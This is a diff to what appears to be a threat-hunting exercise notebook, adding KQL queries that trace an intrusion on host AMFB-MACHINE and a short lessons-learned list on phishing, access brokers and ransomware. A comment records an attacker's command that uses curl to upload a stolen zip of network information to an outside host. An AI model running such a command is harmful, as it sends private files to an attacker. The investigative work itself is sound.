@@ -108,7 +108,31 @@ ProcessEvents
 
 ProcessEvents
 | where hostname == "AMFB-MACHINE"
-| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
+| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17)) and username == "andavis" and process_commandline has ".exe"
+// advanced-ip-scanner.exe
+// network_diagrams.pdf
+// credentials.txt
+// important_network_info.zip - 2024-05-16T13:39:48Z
 
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17)) and process_commandline has "curl"
+// cmd.exe /c curl -F "file=@C:\Users\andavis\Desktop\important_network_info.zip" https://nothing-to-see-here.net/upload
 
+// What We Learned:
+
+//    How Hackers Get In:
+//        Phishing and Fake Ads: Hackers can trick people into clicking fake ads and downloading harmful files. It's important to be careful about what you click and download.
+//
+//    What Hackers Do Once Inside:
+//        Manual Hacking: After getting in, hackers can move around the network, steal information, and set up for more attacks.
+//
+//    Hackers Working Together:
+//        Selling Access: Some hackers break in and then sell that access to other hackers who can do more damage, like LockByte.
+//
+//    Ransomware Attacks:
+//        Locking Files: Ransomware groups lock important files and demand money to unlock them. This can be very harmful, especially for places like hospitals.
+//
+//    Investigating Attacks:
+//        Finding Clues: By looking at different data sources, we can trace the hackers' actions and understand how the attack happened.
 
